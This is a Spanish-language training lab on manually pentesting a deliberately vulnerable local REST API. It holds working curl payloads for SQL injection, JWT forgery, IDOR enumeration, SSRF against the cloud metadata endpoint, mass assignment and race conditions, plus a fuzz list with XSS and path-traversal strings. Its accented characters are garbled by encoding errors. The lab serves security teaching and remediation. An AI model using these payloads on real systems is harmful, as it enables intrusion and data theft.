# Lab 3.3: Pentesting Manual de APIs (75 min)

## üéØ Objetivo

Aprender t√©cnicas de **pentesting manual** para APIs REST, usando herramientas como **Postman**, **curl**, y **Burp Suite**. A diferencia del DAST automatizado (Lab 3.2), aqu√≠ explorar√°s vulnerabilidades mediante an√°lisis manual y l√≥gica de negocio.

## üìö Conceptos Clave

### ¬øPor qu√© Pentesting Manual?

Las herramientas automatizadas (ZAP, SonarQube) son excelentes, pero tienen limitaciones:

| Limitaci√≥n | Ejemplo |
|------------|---------|
| **L√≥gica de negocio** | No detectan "comprar con precio negativo" |
| **Flujos complejos** | No entienden workflows de m√∫ltiples pasos |
| **Autorizaci√≥n contextual** | No detectan "admin puede ver, pero no modificar" |
| **Race conditions** | No hacen requests concurrentes |
| **Parameter tampering** | No prueban todas las combinaciones de par√°metros |

**Pentesting manual** complementa el automatizado, enfoc√°ndose en:
- ‚úÖ L√≥gica de negocio vulnerable
- ‚úÖ Autorizaci√≥n compleja
- ‚úÖ Manipulaci√≥n de JWT
- ‚úÖ IDOR (Insecure Direct Object Reference)
- ‚úÖ Parameter pollution
- ‚úÖ Race conditions

### Metodolog√≠a OWASP API Security Testing

1. **Reconnaissance** - Descubrir endpoints
2. **Authentication** - Probar mecanismos de autenticaci√≥n
3. **Authorization** - Verificar controles de acceso
4. **Input Validation** - Fuzzing de par√°metros
5. **Business Logic** - Probar flujos de negocio
6. **Error Handling** - Forzar errores para obtener informaci√≥n

---

## üîó Relaci√≥n con Otros Labs

| Lab Anterior | Conexi√≥n | Este Lab |
|--------------|----------|----------|
| **Lab 3.1 (API Security)** | Creamos VulnerableShopAPI ‚Üí | Hacemos pentesting manual |
| **Lab 3.2 (DAST ZAP)** | Escaneamos autom√°ticamente ‚Üí | Confirmamos y profundizamos manualmente |

---

## üìã Prerequisitos

- ‚úÖ VulnerableShopAPI del Lab 3.1 funcionando
- ‚úÖ Postman instalado (o Insomnia/Thunder Client)
- ‚úÖ curl (viene con macOS/Linux)
- ‚úÖ Opcional: Burp Suite Community Edition
- ‚úÖ Opcional: jq para parsear JSON

---

## üõ†Ô∏è Parte 1: Setup y Reconocimiento (10 min)

### Paso 1: Iniciar VulnerableShopAPI

```bash
cd /Users/black4ninja/Meeplab/Chihuahua/curso-5dias/dia3-implementacion-controles/laboratorios/lab3.1-api-security/VulnerableShopAPI

dotnet restore
dotnet run
```

**Verificar:**
```bash
curl http://localhost:5000/health
# Esperado: {"status":"healthy"}
```

### Paso 2: Instalar Herramientas

**Postman (Recomendado):**
```bash
# macOS
brew install --cask postman

# Windows
choco install postman

# Linux
snap install postman
```

**jq (Para parsear JSON en terminal):**
```bash
# macOS
brew install jq

# Linux
sudo apt-get install jq

# Windows
choco install jq
```

### Paso 3: Reconocimiento de Endpoints

**Opci√≥n A: Swagger UI (Caja Blanca)**
```bash
open http://localhost:5000/swagger
```

Descubrir√°s:
- `POST /api/auth/register`
- `POST /api/auth/login`
- `GET /api/users`
- `GET /api/users/search`
- `GET /api/orders/\{id\}`
- `GET /api/products/search`
- `GET /api/download`
- `GET /api/fetch`

**Opci√≥n B: Reconocimiento Manual (Caja Negra)**
```bash
# Probar endpoints comunes
curl -s http://localhost:5000/api/users
curl -s http://localhost:5000/api/auth
curl -s http://localhost:5000/api/orders

# Fuzzing b√°sico
for endpoint in users orders products admin; do
  echo "Testing /api/$endpoint"
  curl -s -o /dev/null -w "%{http_code}" http://localhost:5000/api/$endpoint
  echo ""
done
```

**Crear colecci√≥n de Postman:**
1. En Postman: New ‚Üí Collection ‚Üí "VulnerableShop Pentest"
2. Importar OpenAPI: Import ‚Üí Link: `http://localhost:5000/swagger/v1/swagger.json`

---

## üîê Parte 2: Pentesting de Autenticaci√≥n (15 min)

### Vulnerabilidad 1: Broken Authentication

**Objetivo:** Explotar autenticaci√≥n d√©bil.

#### Test 1: Registro sin Validaci√≥n

```bash
# ‚ùå Intentar registrar usuario con email inv√°lido
curl -X POST http://localhost:5000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "not-an-email",
    "password": "123",
    "name": "Test User"
  }' | jq

# ¬øSe registr√≥? ‚úÖ Vulnerabilidad: No hay validaci√≥n de email
```

#### Test 2: Password D√©bil

```bash
# ‚ùå Registrar con password d√©bil
curl -X POST http://localhost:5000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "weak@test.com",
    "password": "123",
    "name": "Weak User"
  }' | jq

# ¬øSe registr√≥? ‚úÖ Vulnerabilidad: No hay pol√≠tica de passwords
```

#### Test 3: JWT Sin Expiraci√≥n

```bash
# 1. Registrar y obtener token
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "admin@shop.com",
    "password": "Admin123!"
  }' | jq -r '.token')

echo "Token: $TOKEN"

# 2. Decodificar JWT (sin verificar firma)
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | jq

# Buscar campo "exp" (expiration)
# ‚ùå Si no existe "exp": Vulnerabilidad - Token no expira
```

**Decodificar JWT manualmente:**
```bash
# Payload del token (parte 2)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxIiwiZW1haWwiOiJhZG1pbkBzaG9wLmNvbSIsInJvbGUiOiJBZG1pbiJ9.xyz" \
  | cut -d'.' -f2 \
  | base64 -d 2>/dev/null \
  | jq

# Output esperado:
# {
#   "userId": "1",
#   "email": "admin@shop.com",
#   "role": "Admin"
#   # ‚ùå FALTA: "exp", "iat", "nbf"
# }
```

#### Test 4: JWT Manipulation

```bash
# Manipular payload del token para cambiar role a "Admin"
# (Requiere conocer secret key, pero intentaremos)

# Crear nuevo payload
NEW_PAYLOAD=$(echo '{
  "userId": "999",
  "email": "hacker@test.com",
  "role": "Admin"
}' | base64)

# Crear token manipulado (header + nuevo payload + firma falsa)
FAKE_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.$NEW_PAYLOAD.fake_signature"

# Probar token manipulado
curl -X GET http://localhost:5000/api/admin/users \
  -H "Authorization: Bearer $FAKE_TOKEN"

# ‚ùå Si funciona: Vulnerabilidad - No valida firma JWT
# ‚úÖ Si falla 401: JWT est√° validado correctamente
```

---

## üîì Parte 3: Pentesting de Autorizaci√≥n (IDOR) (15 min)

### Vulnerabilidad 2: Broken Object Level Authorization (BOLA/IDOR)

**Objetivo:** Acceder a recursos de otros usuarios.

#### Test 1: IDOR en Orders

```bash
# 1. Login como usuario normal
USER_TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "user1@shop.com",
    "password": "User123!"
  }' | jq -r '.token')

# 2. Ver mi orden (ID=1)
curl -X GET http://localhost:5000/api/orders/1 \
  -H "Authorization: Bearer $USER_TOKEN" | jq

# 3. ‚ùå Intentar ver orden de otro usuario (ID=2, 3, 4...)
curl -X GET http://localhost:5000/api/orders/2 \
  -H "Authorization: Bearer $USER_TOKEN" | jq

# ¬øDevolvi√≥ la orden? ‚úÖ Vulnerabilidad IDOR
```

**Automatizar IDOR fuzzing:**
```bash
# Probar IDs del 1 al 100
for id in {1..100}; do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X GET http://localhost:5000/api/orders/$id \
    -H "Authorization: Bearer $USER_TOKEN")

  if [ "$RESPONSE" == "200" ]; then
    echo "‚úÖ IDOR: Acceso a orden $id"
  fi
done
```

#### Test 2: IDOR con Enumeration

```bash
# ‚ùå Intentar acceder a recursos secuenciales
curl -s http://localhost:5000/api/users/1 -H "Authorization: Bearer $USER_TOKEN" | jq '.email'
curl -s http://localhost:5000/api/users/2 -H "Authorization: Bearer $USER_TOKEN" | jq '.email'
curl -s http://localhost:5000/api/users/3 -H "Authorization: Bearer $USER_TOKEN" | jq '.email'

# ‚úÖ Vulnerabilidad: Enumerar todos los usuarios del sistema
```

#### Test 3: Horizontal Privilege Escalation

```bash
# 1. Login como user1
USER1_TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user1@shop.com","password":"User123!"}' | jq -r '.token')

# 2. Obtener mi perfil
curl -s http://localhost:5000/api/users/me \
  -H "Authorization: Bearer $USER1_TOKEN" | jq

# 3. ‚ùå Intentar modificar perfil de otro usuario (user2, ID=2)
curl -X PUT http://localhost:5000/api/users/2 \
  -H "Authorization: Bearer $USER1_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "user2@shop.com",
    "name": "Hacked User",
    "balance": 999999
  }' | jq

# ¬øFuncion√≥? ‚úÖ Vulnerabilidad: Privilege escalation horizontal
```

---

## üíâ Parte 4: Injection Attacks (10 min)

### Vulnerabilidad 3: SQL Injection

#### Test 1: SQL Injection en Search

```bash
# ‚ùå Payload b√°sico de SQL Injection
curl -s "http://localhost:5000/api/users/search?username=admin' OR '1'='1" | jq

# ¬øDevolvi√≥ todos los usuarios? ‚úÖ Vulnerable a SQLi
```

#### Test 2: Union-Based SQL Injection

```bash
# Intentar extraer datos de otras tablas
curl -s "http://localhost:5000/api/users/search?username=admin' UNION SELECT 1,2,3,4,5--" | jq

# Extraer version de DB
curl -s "http://localhost:5000/api/users/search?username=admin' UNION SELECT @@version,2,3,4,5--" | jq
```

#### Test 3: Blind SQL Injection

```bash
# Time-based blind SQLi
time curl -s "http://localhost:5000/api/users/search?username=admin' AND SLEEP(5)--"

# Si tarda 5 segundos: ‚úÖ Vulnerable a Blind SQLi
```

### Vulnerabilidad 4: Server-Side Request Forgery (SSRF)

```bash
# ‚ùå Intentar hacer request a localhost
curl -s "http://localhost:5000/api/fetch?url=http://localhost:5000/api/users" | jq

# ‚ùå Intentar acceder a metadata de cloud (AWS)
curl -s "http://localhost:5000/api/fetch?url=http://169.254.169.254/latest/meta-data/" | jq

# ‚ùå Intentar acceder a red interna
curl -s "http://localhost:5000/api/fetch?url=http://192.168.1.1" | jq

# Si devuelve contenido: ‚úÖ Vulnerable a SSRF
```

---

## üî¢ Parte 5: Parameter Tampering y Business Logic (15 min)

### Vulnerabilidad 5: Mass Assignment

```bash
# ‚ùå Intentar crear usuario con role "Admin"
curl -X POST http://localhost:5000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "hacker@test.com",
    "password": "Hacker123!",
    "name": "Hacker",
    "role": "Admin",
    "balance": 999999
  }' | jq

# ¬øSe cre√≥ como Admin con balance alto? ‚úÖ Vulnerable a Mass Assignment
```

### Vulnerabilidad 6: Business Logic - Negative Amount

```bash
# ‚ùå Intentar crear orden con precio negativo (ganar dinero)
curl -X POST http://localhost:5000/api/orders \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "productName": "iPhone",
    "amount": -1000,
    "quantity": 1
  }' | jq

# Si se crea y aumenta el balance: ‚úÖ Vulnerable a l√≥gica de negocio
```

### Vulnerabilidad 7: Parameter Pollution

```bash
# ‚ùå HTTP Parameter Pollution (enviar m√∫ltiples par√°metros con mismo nombre)
curl -s "http://localhost:5000/api/products/search?keyword=laptop&keyword=' OR '1'='1" | jq

# Algunos frameworks toman el √∫ltimo par√°metro, otros el primero
```

### Vulnerabilidad 8: Race Condition

```bash
# Crear script para race condition en balance
cat > race_condition.sh << 'EOF'
#!/bin/bash
TOKEN="$1"

# Funci√≥n para hacer withdraw concurrente
withdraw() {
  curl -s -X POST http://localhost:5000/api/wallet/withdraw \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"amount": 100}' &
}

# Ejecutar 10 withdraws simult√°neos
for i in {1..10}; do
  withdraw
done

wait
echo "Race condition test completado"
EOF

chmod +x race_condition.sh
./race_condition.sh "$USER_TOKEN"

# Si el balance queda negativo: ‚úÖ Vulnerable a race condition
```

---

## üìÑ Parte 6: Information Disclosure (10 min)

### Vulnerabilidad 9: Excessive Data Exposure

```bash
# ‚ùå Endpoint devuelve m√°s datos de los necesarios
curl -s http://localhost:5000/api/users \
  -H "Authorization: Bearer $USER_TOKEN" | jq

# ¬øIncluye passwordHash, internalId, etc? ‚úÖ Excessive Data Exposure
```

### Vulnerabilidad 10: Error-Based Information Disclosure

```bash
# ‚ùå Forzar errores para obtener stack traces
curl -s http://localhost:5000/api/users/abc | jq
curl -s http://localhost:5000/api/orders/-1 | jq
curl -s "http://localhost:5000/api/products/search?keyword=" | jq

# ¬øDevuelve stack traces, rutas de archivos, versiones? ‚úÖ Info Disclosure
```

### Vulnerabilidad 11: Sensitive Data in URL

```bash
# ‚ùå Datos sensibles en query parameters (se loggean)
curl -s "http://localhost:5000/api/auth/reset-password?token=secret123&email=user@test.com" | jq

# Mejor: Enviar en body POST
```

---

## üß™ Parte 7: Documentar Hallazgos (10 min)

### Crear Reporte de Pentesting

Crea un archivo `pentest_report.md`:

```markdown
# Reporte de Pentesting Manual - VulnerableShopAPI

**Fecha:** 2025-12-11
**Tester:** [Tu nombre]
**Aplicaci√≥n:** VulnerableShopAPI
**URL:** http://localhost:5000

---

## Resumen Ejecutivo

Se realiz√≥ pentesting manual de la API VulnerableShopAPI. Se identificaron **11 vulnerabilidades** de severidad ALTA y MEDIA.

| Severidad | Cantidad |
|-----------|----------|
| üî¥ ALTA | 7 |
| üü† MEDIA | 4 |

---

## Vulnerabilidades Identificadas

### üî¥ ALTA - V1: IDOR en Endpoint de Orders

**CWE:** CWE-639 (Authorization Bypass)
**OWASP API:** API1:2023 - Broken Object Level Authorization

**Descripci√≥n:**
El endpoint `/api/orders/\{id\}` no valida que el usuario autenticado sea el due√±o de la orden, permitiendo acceder a √≥rdenes de otros usuarios.

**Pasos de Reproducci√≥n:**
1. Login como user1 (user1@shop.com)
2. GET /api/orders/1 ‚Üí ‚úÖ Mi orden
3. GET /api/orders/2 ‚Üí ‚úÖ Orden de otro usuario (VULNERABLE)

**Evidencia:**
\`\`\`bash
curl -X GET http://localhost:5000/api/orders/2 \\
  -H "Authorization: Bearer $USER_TOKEN"

# Response: {"id":2,"userId":2,"productName":"Laptop",...}
# ‚ùå userId=2 pero mi token es de userId=1
\`\`\`

**Impacto:**
- Exposici√≥n de informaci√≥n confidencial de otros usuarios
- Violaci√≥n de privacidad
- Posible fraude

**Recomendaci√≥n:**
\`\`\`csharp
// ‚úÖ CORRECCI√ìN
[HttpGet("\{id\}")]
[Authorize]
public IActionResult GetOrder(int id)
{
    var userId = int.Parse(User.FindFirst("userId")?.Value ?? "0");
    var order = _context.Orders
        .FirstOrDefault(o => o.Id == id && o.UserId == userId);

    if (order == null) return NotFound();
    return Ok(order);
}
\`\`\`

**Referencias:**
- OWASP API Security Top 10 2023: API1
- CWE-639: Authorization Bypass Through User-Controlled Key

---

### üî¥ ALTA - V2: SQL Injection en User Search

[... Repetir formato para las otras 10 vulnerabilidades ...]

---

## Conclusiones

La aplicaci√≥n VulnerableShopAPI presenta m√∫ltiples vulnerabilidades cr√≠ticas que deben ser remediadas antes de cualquier despliegue a producci√≥n.

**Prioridades de Remediaci√≥n:**
1. **P0 - Cr√≠tico:** SQL Injection (V2), IDOR (V1), SSRF (V4)
2. **P1 - Alta:** JWT sin expiraci√≥n (V3), Mass Assignment (V5)
3. **P2 - Media:** Excessive Data Exposure (V9), Error disclosure (V10)

---

**Tester:** [Firma digital]
**Fecha:** 2025-12-11
```

---

## üì¶ Entregables del Laboratorio

### Archivos a Entregar:

1. ‚úÖ **Reporte de Pentesting** (`pentest_report.md`)
   - M√≠nimo 8 vulnerabilidades documentadas
   - Formato: Descripci√≥n ‚Üí Reproducci√≥n ‚Üí Evidencia ‚Üí Impacto ‚Üí Recomendaci√≥n

2. ‚úÖ **Colecci√≥n de Postman** (`VulnerableShop_Pentest.postman_collection.json`)
   - Todos los tests organizados por categor√≠a
   - Variables para tokens y URLs

3. ‚úÖ **Scripts de Automatizaci√≥n** (carpeta `scripts/`)
   - `idor_fuzzer.sh` - Fuzzing de IDOR
   - `sqli_test.sh` - Tests de SQL Injection
   - `race_condition.sh` - Test de race condition

4. ‚úÖ **Evidencia Visual** (capturas de pantalla)
   - M√≠nimo 3 vulnerabilidades con screenshots
   - Mostrar request y response

---

## ‚úÖ Checklist de Validaci√≥n

Antes de entregar, verifica:

- [ ] VulnerableShopAPI corriendo en localhost:5000
- [ ] Postman collection creada con todos los endpoints
- [ ] M√≠nimo 8 vulnerabilidades explotadas exitosamente
- [ ] Reporte de pentesting completo con:
  - [ ] Descripci√≥n de cada vulnerabilidad
  - [ ] Pasos de reproducci√≥n
  - [ ] Evidencia (curl commands o screenshots)
  - [ ] Impacto de negocio
  - [ ] Recomendaci√≥n de correcci√≥n
- [ ] Scripts de automatizaci√≥n funcionales
- [ ] Vulnerabilidades mapeadas a:
  - [ ] OWASP API Security Top 10 2023
  - [ ] CWE
  - [ ] ISO/IEC 27002:2022

---

## üîó Mapeo a Est√°ndares de Seguridad

### OWASP API Security Top 10 2023

| Vulnerabilidad | OWASP API | Lab Test |
|----------------|-----------|----------|
| **IDOR en Orders** | API1: BOLA | Parte 3, Test 1 |
| **JWT sin expiraci√≥n** | API2: Broken Authentication | Parte 2, Test 3 |
| **Excessive Data Exposure** | API3 | Parte 6, Test 1 |
| **Mass Assignment** | API6 | Parte 5, Test 1 |
| **SSRF** | API7 | Parte 4, Test 2 |
| **SQL Injection** | API8: Injection | Parte 4, Test 1 |

### CWE (Common Weakness Enumeration)

| Vulnerabilidad | CWE |
|----------------|-----|
| **IDOR** | CWE-639: Authorization Bypass |
| **SQL Injection** | CWE-89: SQL Injection |
| **SSRF** | CWE-918: Server-Side Request Forgery |
| **Mass Assignment** | CWE-915: Improperly Controlled Modification |
| **Race Condition** | CWE-362: Concurrent Execution using Shared Resource |
| **Information Disclosure** | CWE-200: Exposure of Sensitive Information |

### ISO/IEC 27002:2022

| Control | Nombre | Aplicaci√≥n en este Lab |
|---------|--------|----------------------|
| **8.3** | Information access restriction | IDOR testing (Parte 3) |
| **8.8** | Management of technical vulnerabilities | Identificaci√≥n de vulns manuales |
| **8.16** | Monitoring activities | Error disclosure testing |
| **8.29** | Security testing | Pentesting manual completo |

---

## üöÄ Extensi√≥n: Aplicar a tu C√≥digo (OPCIONAL)

### Metodolog√≠a de Pentesting para tu API

**Paso 1: Mapear Endpoints**
```bash
# Crear inventario de endpoints
cat > api_inventory.txt << EOF
POST /api/auth/login
POST /api/auth/register
GET /api/users/\{id\}
PUT /api/users/\{id\}
DELETE /api/users/\{id\}
GET /api/orders
POST /api/orders
...
EOF
```

**Paso 2: Matriz de Autorizaci√≥n**

| Endpoint | An√≥nimo | Usuario | Admin | Due√±o del Recurso |
|----------|---------|---------|-------|-------------------|
| GET /api/users/\{id\} | ‚ùå 401 | ‚ùå 403 | ‚úÖ 200 | ‚úÖ 200 |
| PUT /api/users/\{id\} | ‚ùå 401 | ‚ùå 403 | ‚úÖ 200 | ‚úÖ 200 |
| DELETE /api/users/\{id\} | ‚ùå 401 | ‚ùå 403 | ‚úÖ 200 | ‚ùå 403 |

**Paso 3: Tests de Autorizaci√≥n**
```bash
# Para cada endpoint, probar con diferentes roles
for endpoint in $(cat api_inventory.txt); do
  echo "Testing $endpoint"

  # Sin auth
  curl -s -o /dev/null -w "An√≥nimo: %{http_code}\n" "$endpoint"

  # Con usuario normal
  curl -s -o /dev/null -w "Usuario: %{http_code}\n" \
    -H "Authorization: Bearer $USER_TOKEN" "$endpoint"

  # Con admin
  curl -s -o /dev/null -w "Admin: %{http_code}\n" \
    -H "Authorization: Bearer $ADMIN_TOKEN" "$endpoint"
done
```

**Paso 4: Fuzzing de Par√°metros**
```bash
# Crear wordlist de payloads
cat > payloads.txt << EOF
' OR '1'='1
' UNION SELECT NULL--
<script>alert('XSS')</script>
../../etc/passwd
${7*7}
{{7*7}}
http://169.254.169.254/
EOF

# Fuzz cada par√°metro
cat payloads.txt | while read payload; do
  curl -s "http://localhost:5000/api/search?q=$payload"
done
```

---

## üõ†Ô∏è Herramientas Avanzadas (Opcional)

### Burp Suite Community Edition

**Uso:**
1. Configurar proxy (localhost:8080)
2. Configurar Postman para usar proxy de Burp
3. Enviar requests desde Postman ‚Üí Capturar en Burp
4. Usar Intruder para fuzzing automatizado

**Ventaja sobre curl:**
- Interfaz gr√°fica
- History de requests
- Repeater para modificar/reenviar
- Intruder para fuzzing

### FFuf (Fast Fuzzer)

```bash
# Instalar
brew install ffuf

# Fuzzing de IDOR
ffuf -u http://localhost:5000/api/orders/FUZZ \
  -w <(seq 1 1000) \
  -H "Authorization: Bearer $USER_TOKEN" \
  -mc 200

# Fuzzing de subdominios
ffuf -u http://FUZZ.ejemplo.com/api/users \
  -w subdomains.txt \
  -mc 200
```

---

## üìö Recursos Adicionales

### Gu√≠as de Pentesting

- üìò **OWASP API Security Testing Guide**: https://owasp.org/www-project-api-security/
- üìò **HackTricks - API Pentesting**: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/web-api-pentesting
- üìò **PortSwigger Web Security Academy**: https://portswigger.net/web-security/api-testing

### Wordlists y Payloads

- üì¶ **SecLists**: https://github.com/danielmiessler/SecLists
- üì¶ **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings
- üì¶ **Assetnote Wordlists**: https://wordlists.assetnote.io/

---

## üèÅ Conclusi√≥n

En este laboratorio aprendiste a:

‚úÖ Realizar reconocimiento manual de APIs
‚úÖ Pentesting de autenticaci√≥n y autorizaci√≥n
‚úÖ Explotar IDOR y BOLA manualmente
‚úÖ Realizar injection attacks (SQLi, SSRF)
‚úÖ Probar business logic vulnerabilities
‚úÖ Documentar hallazgos profesionalmente
‚úÖ Crear reportes de pentesting con evidencia

**Diferencias clave con DAST automatizado (Lab 3.2):**

| Aspecto | DAST (ZAP) | Pentesting Manual |
|---------|------------|-------------------|
| **Velocidad** | R√°pido | Lento |
| **Cobertura** | Alta | Media |
| **L√≥gica de negocio** | ‚ùå No detecta | ‚úÖ Detecta |
| **False Positives** | M√°s altos | M√°s bajos |
| **Evidencia** | Automatizada | Manual (mejor calidad) |

**Pr√≥ximo Lab**: [Lab 3.4 - Auditor√≠a de Configuraciones](./lab-3-4-auditoria-configuraciones/) donde revisaremos configuraciones de seguridad (headers, CORS, cookies, HTTPS).

---

**Tiempo total**: 75 minutos
**Dificultad**: ‚≠ê‚≠ê‚≠ê‚≠ê Avanzada
**Prerequisitos**: Lab 3.1 (VulnerableShopAPI), Lab 3.2 (Conceptos DAST)
